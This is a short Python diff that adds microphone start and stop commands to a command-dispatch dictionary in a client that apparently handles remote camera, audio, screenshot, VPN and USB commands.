@@ -1,5 +1,5 @@
 from clientV2.core.services.logger_service import LoggerService
-from clientV2.adapters.devices import camera_adapter, screenshot_adapter
+from clientV2.adapters.devices import camera_adapter, screenshot_adapter, microphone_adapter
 from clientV2.core.use_cases import vpn_connection, usb_ports, send_recorded_audio
 
 # Словарь команд и соответствующих обработчиков.
@@ -7,6 +7,8 @@ COMMAND_HANDLERS = {
     "start_camera": camera_adapter.start_camera_stream,
     "stop_camera": camera_adapter.stop_camera_stream,
     "capture_frame": camera_adapter.capture_frame,
+    "start_mic": microphone_adapter.start_audio_stream,
+    "stop_mic": microphone_adapter.stop_audio_stream,
     "record_audio": send_recorded_audio.send_recorded_audio,
     "screenshot": screenshot_adapter.screenshot,
     "create_vpn": vpn_connection.create_vpn_connection,
